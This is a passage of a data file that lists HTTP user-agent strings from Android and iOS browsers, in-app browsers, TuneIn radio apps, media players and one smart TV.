Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; MI 8 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Nokia 2.2 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; INE-LX1 Build/HUAWEIINE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Dalvik/2.1.0 (Linux; U; Android 13; SCG09 Build/TP1A.220624.014)","TuneIn Radio/25.2.1; iPhone13,1; iOS/16.1","Mozilla/5.0 (Linux; Android 12; SM-M215F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; CPH2021 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; moto g(20) Build/RTAS31.68-66-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 10; P20HD_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 8.1.0; BBF100-6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 GNews Android/2022120648","TuneIn Radio Pro/25.2.1; iPhone14,2; iOS/16.4.1","Mozilla/5.0 (Linux; Android 6.0.1; ZTE A2017G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; moto g23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A405FN/A405FNXXU1ASC8) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-A600FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 8.1.0; Lenovo TB-X304L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 10; COL-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A037F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; moto e(6i)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Radio/2.12 (Linux;Android 13) ExoPlayerLib/1.5.3","Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; Nokia X30 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Safari/537.36 OPR/74.1.3922.71199","Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; M2006C3LI Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio Pro/25.2.1; iPhone11,6; iOS/16.4.1","Mozilla/5.0 (Linux; Android 13; SM-G9910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Mi 9 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; RNE-L21 Build/HUAWEIRNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 12; 22126RN91Y Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-X700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A025G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/23.2.0; iPad6,11; iPadOS/16.4.1","Mozilla/5.0 (Linux; Android 12; 2107113SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio/25.2.1; iPad7,12; iPadOS/16.4","Mozilla/5.0 (Linux; Android 11; SM-T290 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; SM-G981B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/349.0.0.8.103;]","Mozilla/5.0 (Linux; Android 12; moto g22 Build/STA32.79-77-28-50; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; M2007J22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; moto e40 Build/ROQ31.166-76; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; SM-A605GN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","AppleCoreMedia/1.0.0.22E261 (Macintosh; U; Intel Mac OS X 13_3_1; en_gb)","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone15,2; iOS 16_3_1; tr_TR; tr-TR; scale=3.00; 1179x2556; 462633398)","Mozilla/5.0 (Linux; Android 13; CPH2195 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio Pro/25.2.1; iPhone15,3; iOS/16.4.1","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R111-15329.52.0)","Mozilla/5.0 (Linux; Android 13; SM-A047F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 8.1.0; SM-T580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.73 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]","Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4448082816)","Mozilla/5.0 (Linux; Android 8.1.0; 5033G_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","TuneIn Radio Pro/25.2.1; iPhone13,3; iOS/16.4.1","Mozilla/5.0 (Linux; Android 9; SM-A405FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]","Mozilla/5.0 (Linux; Android 12; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2207 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; ASUS_X00TD Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; A80Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.192 Mobile Safari/537.36 OPR/74.1.3922.71199","Mozilla/5.0 (Linux; Android 10; vivo 2015 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Mobile Safari/537.36","AppleCoreMedia/1.0.0.20E252 (iPhone; U; CPU OS 16_4_1 like Mac OS X; it_ch)","Mozilla/5.0 (Linux; Android 11; M2103K19G Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (Linux; Android 6.0.1; SM-A500FU Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 GNews Android/2022025368","Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 10; SM-A750FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; CPH1917 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; LM-X430 Build/QKQ1.200730.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/337.0.0.7.102;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/81.0.264749124 Mobile/15E148 Safari/605.1","Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 EdgA/111.0.1661.59","AppleCoreMedia/1.0.0.8C148 (iPod; U; CPU OS 4_2_1 like Mac OS X; hr_hr)","Mozilla/5.0 (Linux; Android 10; SM-G975F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; SM-T580) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2211) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; M2103K19PG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 277.1.0.20.110 (iPhone13,1; iOS 16_3_1; tr_TR; tr-TR; scale=2.88; 1080x2338; 462633398)","Mozilla/5.0 (Linux; Android 13; M2101K9G Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 8.1.0; View2 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; Armor X5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; HTC Desire 20 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; moto e(6i) Build/QOH30.270-40) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 11; RMX2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; moto g 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36","TuneIn Radio/25.2.0; iPad8,6; iPadOS/16.3","Mozilla/5.0 (Linux; Android 9; SM-A105FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; V2041 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.56 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; C20 Pro Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 Config/100.2.1201.2","Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTBS29.401-58-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/349.0.0.8.103;]","TuneIn Radio/25.2.1; iPad7,3; iOS/14.7.1","Mozilla/5.0 (Linux; Android 10; M2003J15SC Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; motorola one vision Build/RSA31.Q1-48-36-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 12; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A515F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]","Mozilla/5.0 (Linux; Android 12; RMX3241 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 12; SM-G981N Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 11; A70) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; M2101K9G Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022122934","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.70.100","Mozilla/5.0 (Linux; Android 13; V2127 Build/TP1A.220624.014_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 9; ASUS_A001D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 4188C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 13; KB2003 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 7.0; SM-T819 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.115 Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 13; M2101K9AG Build/TKQ1.221013.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 13; SM-M225FV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; LM-K200 Build/QKQ1.200311.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 GNews Android/2022120660","Mozilla/5.0 (Linux; Android 9; ZTE Blade A5 2020 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 GNews Android/2022071088","Mozilla/5.0 (Linux; Android 10; SM-A307GT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.149 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 11; T671H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-A516B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 12; SM-A225M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; M2103K19G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux; Android 13; Nokia X20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2197 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 GNews Android/2022120648","Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 7.0; SM-T719 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.53 Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]","Mozilla/5.0 (Linux; Android 6.0; B3-A32 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.162 Safari/537.36","TuneIn Radio/25.2.1; iPhone14,7; iOS/16.1.1","Mozilla/5.0 (Linux; Android 10; W-V680-EEA Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; XQ-CT54 Build/64.1.A.0.882; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; S41 Build/OPR6.170623.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]","Mozilla/5.0 (Linux; Android 11; SM-T865 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Safari/537.36 GNews Android/2022118446","Mozilla/5.0 (Linux; Android 12; Nokia 2.4 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]","Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2207.0 OMI/4.11.3.57.Martell-3.133 Model/Hisense-MT5659-SDK4-11 (;Hisense;SmartTV;V1100.01.00A.M0112;40A35EEVS) 